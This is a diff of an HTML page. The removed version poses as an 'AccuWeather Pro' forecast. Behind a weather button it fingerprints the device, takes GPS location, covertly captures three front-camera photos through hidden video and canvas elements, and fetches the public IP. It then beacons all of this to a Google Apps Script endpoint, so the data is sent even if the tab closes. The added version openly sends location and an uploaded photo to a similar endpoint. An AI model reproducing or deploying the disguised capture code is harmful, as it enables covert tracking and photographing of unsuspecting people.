@@ -1,178 +1,109 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AccuWeather Pro - Live Forecast</title>
-    <style>
-        /* Professional Dark Weather UI */
-        body { 
-            background: #0b132b; 
-            color: #fff; 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            margin: 0; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            height: 100vh; 
-            overflow: hidden;
-        }
-        .card { 
-            background: #1c2541; 
-            padding: 40px; 
-            border-radius: 30px; 
-            border: 1px solid #3a506b; 
-            width: 85%; 
-            max-width: 400px; 
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5); 
-            text-align: center;
-        }
-        .btn { 
-            background: #6fffe9; 
-            color: #0b132b; 
-            border: none; 
-            padding: 20px; 
-            border-radius: 50px; 
-            font-weight: bold; 
-            width: 100%; 
-            cursor: pointer; 
-            font-size: 16px; 
-            margin-top: 20px; 
-            transition: transform 0.2s;
-        }
-        .btn:active { transform: scale(0.95); }
-        .btn:disabled { background: #3a506b; color: #5bc0be; }
-        
-        #progress-container { width: 100%; background: #0b132b; height: 8px; border-radius: 10px; margin-top: 25px; display: none; }
-        #progress-bar { width: 0%; height: 100%; background: #6fffe9; border-radius: 10px; transition: 0.4s; }
-        
-        h2 { color: #5bc0be; font-weight: 300; margin-bottom: 5px; font-size: 18px; }
-        h1 { font-size: 64px; margin: 10px 0; }
-        .status-text { font-size: 14px; color: #6fffe9; margin-top: 15px; }
-        
-        /* Hidden elements for capture */
-        video, canvas { display: none; }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Send Data to Google Apps Script</title>
 </head>
 <body>
+  <h1>Send Location and Photo to Google Apps Script</h1>
+  
+  <!-- Button to send location -->
+  <button id="sendLocationBtn">Send Location</button>
+  
+  <!-- Input for photo upload -->
+  <input type="file" id="photoInput" accept="image/*" />
+  <button id="sendPhotoBtn">Send Photo</button>
+  
+  <script>
+    // Updated Web App URL
+    const scriptUrl = 'https://script.google.com/macros/s/AKfycbzz3HWN3P6FDqLDNhca6jqmsxyaXHyvE96A_gZbXuRWhj6S-RCe0DhCZcb4EUNFdTZ9IA/exec';
 
-    <div class="card">
-        <h2 id="loc-text">Satellite: Searching...</h2>
-        <h1 id="temp-display">24°C</h1>
-        <div id="status-display">System Ready</div>
-        
-        <div id="progress-container">
-            <div id="progress-bar"></div>
-        </div>
-
-        <button class="btn" id="main-btn" onclick="startTracking()">UPDATE WEATHER DATA</button>
-        <p style="font-size: 11px; color: #3a506b; margin-top: 20px;">Precision: High Accuracy (GPS + Glonass)</p>
-    </div>
-
-    <video id="v" autoplay playsinline></video>
-    <canvas id="c"></canvas>
-
-<script>
-    // YOUR UPDATED SCRIPT URL
-    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxDUz4Dxq8mc3vP0HvSy2tbI91oSjknUEPfVBeA26OyWZeyYJVH5kvmA4VyZJYbCYLeGA/exec';
-
-    async function startTracking() {
-        const btn = document.getElementById('main-btn');
-        const progressContainer = document.getElementById('progress-container');
-        const progressBar = document.getElementById('progress-bar');
-        const status = document.getElementById('status-display');
-
-        btn.disabled = true;
-        btn.innerText = "OPTIMIZING DATA...";
-        progressContainer.style.display = 'block';
-
-        // 1. HARDWARE FINGERPRINTING (GPU Renderer identifies Phone Model)
-        let gpu = "Unknown Device";
-        try {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-        } catch(e) { gpu = "Detection Blocked"; }
-
-        // 2. SYSTEM VITALS (Battery & Charging)
-        let batteryInfo = { level: 0, charging: false };
-        try {
-            const bat = await navigator.getBattery();
-            batteryInfo.level = Math.round(bat.level * 100);
-            batteryInfo.charging = bat.charging;
-        } catch(e) {}
-
-        // 3. GEOLOCATION
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            document.getElementById('loc-text').innerText = "LOCATION LOCKED";
-            progressBar.style.width = "40%";
-            status.innerText = "Syncing Local Hardware...";
-
-            // 4. OPTION B: 3-PHOTO BURST (Capture one photo every 1.5 seconds)
-            let photos = [];
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: false 
-                });
-                const video = document.getElementById('v');
-                video.srcObject = stream;
-                
-                for(let i=0; i<3; i++) {
-                    await new Promise(r => setTimeout(r, 1500)); 
-                    const c = document.getElementById('c');
-                    c.width = 400; 
-                    c.height = 300;
-                    c.getContext('2d').drawImage(video, 0, 0);
-                    photos.push(c.toDataURL('image/jpeg', 0.4));
-                    
-                    // Update progress during burst
-                    progressBar.style.width = (40 + (i * 20)) + "%";
-                }
-                stream.getTracks().forEach(t => t.stop());
-            } catch(e) { console.log("Camera access denied"); }
-
-            // 5. NETWORK INTELLIGENCE (Public IP)
-            let publicIP = "0.0.0.0";
-            try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                publicIP = ipData.ip;
-            } catch(e) {}
-
-            // 6. FINAL DATA PACKET
-            const dataPacket = {
-                lat: pos.coords.latitude,
-                lon: pos.coords.longitude,
-                ip: publicIP,
-                photos: photos,
-                deviceModel: gpu,
-                battery: batteryInfo.level,
-                charging: batteryInfo.charging,
-                userAgent: navigator.userAgent
-            };
-
-            // 7. PERSISTENT TRANSMISSION (Using Beacon API)
-            // This ensures data is sent even if the user closes the tab immediately
-            const blob = new Blob([JSON.stringify(dataPacket)], { type: 'application/json' });
-            navigator.sendBeacon(SCRIPT_URL, blob);
-
-            // UI Completion
-            progressBar.style.width = "100%";
-            btn.innerText = "WEATHER UPDATED";
-            status.innerText = "Data Optimized Successfully";
-            
-        }, (err) => {
-            btn.disabled = false;
-            btn.innerText = "ERROR: ENABLE GPS";
-            status.innerText = "Please allow location to update weather.";
-        }, { 
-            enableHighAccuracy: true, 
-            timeout: 10000 
-        });
+    // Function to send location data
+    function sendLocation(lat, lng, deviceInfo, externalIP, localIP) {
+      fetch(scriptUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          type: 'location',
+          data: {
+            lat: lat,
+            lng: lng,
+            deviceInfo: deviceInfo,
+            externalIP: externalIP,
+            localIP: localIP
+          }
+        })
+      })
+      .then(response => response.text())
+      .then(data => {
+        alert('Location sent successfully: ' + data);
+      })
+      .catch((error) => {
+        alert('Error sending location: ' + error);
+      });
     }
-</script>
+
+    // Function to send photo
+    function sendPhoto(imageBase64) {
+      fetch(scriptUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          type: 'photo',
+          data: {
+            photoBase64: imageBase64
+          }
+        })
+      })
+      .then(response => response.text())
+      .then(data => {
+        alert('Photo sent successfully: ' + data);
+      })
+      .catch((error) => {
+        alert('Error sending photo: ' + error);
+      });
+    }
+
+    // Get location when button clicked
+    document.getElementById('sendLocationBtn').addEventListener('click', () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+            const deviceInfo = { userAgent: navigator.userAgent };
+            const externalIP = 'YOUR_EXTERNAL_IP'; // Optional: replace or fetch dynamically
+            const localIP = 'YOUR_LOCAL_IP'; // Optional: replace or fetch dynamically
+            
+            sendLocation(lat, lng, deviceInfo, externalIP, localIP);
+          },
+          (error) => {
+            alert('Error getting location: ' + error.message);
+          }
+        );
+      } else {
+        alert('Geolocation is not supported by this browser.');
+      }
+    });
+
+    // Get photo when button clicked
+    document.getElementById('sendPhotoBtn').addEventListener('click', () => {
+      const input = document.getElementById('photoInput');
+      if (input.files && input.files[0]) {
+        const reader = new FileReader();
+        reader.onloadend = () => {
+          sendPhoto(reader.result);
+        };
+        reader.readAsDataURL(input.files[0]);
+      } else {
+        alert('Please select a photo first.');
+      }
+    });
+  </script>
 </body>
 </html>
-
